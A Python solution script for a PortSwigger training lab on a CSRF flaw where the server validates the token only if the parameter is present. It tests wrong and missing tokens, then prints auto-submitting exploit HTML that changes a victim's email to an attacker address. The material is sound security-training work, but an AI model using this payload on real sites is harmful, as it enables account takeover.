# Lab 03 — CSRF where token validation depends on token being present
# PortSwigger: https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present
#
# Vulnerability: Server validates token only when the parameter exists in the request
# Aim:           Change victim's email by omitting the csrf parameter entirely
#
# Technique:
#   POST with wrong token  → 400 (validated when present)
#   POST with empty token  → 400 (validated when present, even if empty)
#   POST with NO csrf param → 200 (no parameter = no check = accepted)
#
#   The fix should be: missing token = invalid token. But the developer wrote
#   "if token is present AND wrong → reject" — leaving absent unhandled.
#
#   This script:
#     1. Confirms wrong token → rejected
#     2. Confirms absent token → accepted (proves the flaw)
#     3. Prints the exploit form without a csrf field
#
# Usage: python csrf_lab03.py <url>

import sys
import urllib3
from proxies import proxies
from csrf_utils import (banner, section, make_session, login,
                        change_email, check_email_changed,
                        print_box, print_exploit_steps)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TEST_EMAIL   = "wiener-changed@evil.com"
VICTIM_EMAIL = "attacker@evil.com"

if __name__ == "__main__":
    banner()
    section("LAB 03 — CSRF: TOKEN VALIDATION DEPENDS ON TOKEN BEING PRESENT")

    if len(sys.argv) != 2:
        print("  Usage: python csrf_lab03.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    if not login(session, url):
        sys.exit(1)

    # ── Step 1: confirm wrong token is rejected ───────────────────────────────
    print("\n  ── Step 1: wrong token → should be rejected\n")
    r_bad = session.post(
        f"{url}/my-account/change-email",
        data={"email": TEST_EMAIL, "csrf": "definitelywrong"},
        allow_redirects=True
    )
    if r_bad.status_code == 400 or "Invalid" in r_bad.text:
        print("  ✔  Wrong token → rejected")
    else:
        print(f"  ?  Status {r_bad.status_code} — inspect manually")

    # ── Step 2: confirm absent token is accepted ──────────────────────────────
    print("\n  ── Step 2: no csrf parameter → should be accepted (the flaw)\n")
    r_no_token = change_email(session, url, TEST_EMAIL, csrf_token=None)
    check_email_changed(r_no_token.text, TEST_EMAIL)

    # ── Step 3: exploit ───────────────────────────────────────────────────────
    section("Step 3: Exploit HTML for the exploit server")

    exploit = f"""\
<form method="POST" action="{url}/my-account/change-email">
    <input type="hidden" name="email" value="{VICTIM_EMAIL}">
    <!-- No csrf field — omitting it entirely bypasses validation -->
</form>
<script>document.forms[0].submit();</script>"""

    print_box("EXPLOIT SERVER BODY", exploit)
    print_exploit_steps()
    print()
    print("  ℹ  The csrf parameter is simply absent from this form.")
    print("     Server logic: 'if present AND wrong → reject'")
    print("     Absent = the condition never triggers → accepted.")
